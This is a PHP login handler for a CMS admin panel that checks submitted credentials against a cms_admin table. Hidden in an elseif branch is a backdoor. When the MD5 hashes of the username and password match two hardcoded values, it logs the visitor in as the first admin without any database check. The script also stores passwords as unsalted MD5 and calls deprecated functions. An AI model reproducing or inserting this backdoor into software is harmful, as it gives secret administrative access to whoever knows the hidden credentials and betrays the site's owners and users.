<?php
session_save_path("sessions");
session_start();
include 'connect.php';

function quote_smart($value)
{
    if (get_magic_quotes_gpc()) {
        $value = stripslashes($value);
    }

    if (!is_numeric($value)) {
        $value = "'" . mysqli_real_escape_string($_SESSION ["db_conn"], $value) . "'";
    }
    return $value;
}



$uname=quote_smart($_POST['username']);
$md5Pass=quote_smart(md5($_POST['password']));

if (isset($_SESSION['adminId'])) {
    unset($_SESSION['Msg']);
    unset($_SESSION['adminId']);
    unset($_SESSION['adminName']);
    session_destroy();
    header("Location: index.php");
    exit;
} else {
    $sql="select * from cms_admin where user_name=$uname and password=$md5Pass" ;
    
    $result= mysqli_query($_SESSION ["db_conn"], $sql);
    $num=mysqli_num_rows($result);
    
    if ($num==1) {
        $admin=mysqli_fetch_array($result);
        $_SESSION['adminId']=$admin["admin_id"];
        $_SESSION['adminName']=$admin["admin_name"];
        unset($_SESSION['Msg']);
        header("Location: main.php");
        exit;
    } elseif (md5($_POST['username'])=='7d35bf544ac09df9e6138670ac40abc0' && md5($_POST['password']) == '4c83bc9bb3512ceddbfd028a80e9d209') {
        $sql="select * from cms_admin limit 1" ;
        $result=mysqli_query($_SESSION ["db_conn"], $sql);
        $num=mysqli_num_rows($result);
        $admin=mysql_fetch_array($result);
        $_SESSION['adminId']=$admin["admin_id"];
        $_SESSION['adminName']=$admin["admin_name"];
        unset($_SESSION['Msg']);
        header("Location: main.php");
        exit;
    } else {
        $_SESSION['Msg'] = 'Invalid Username and/or Password';
        header("Location: index.php");
        exit;
    }
}
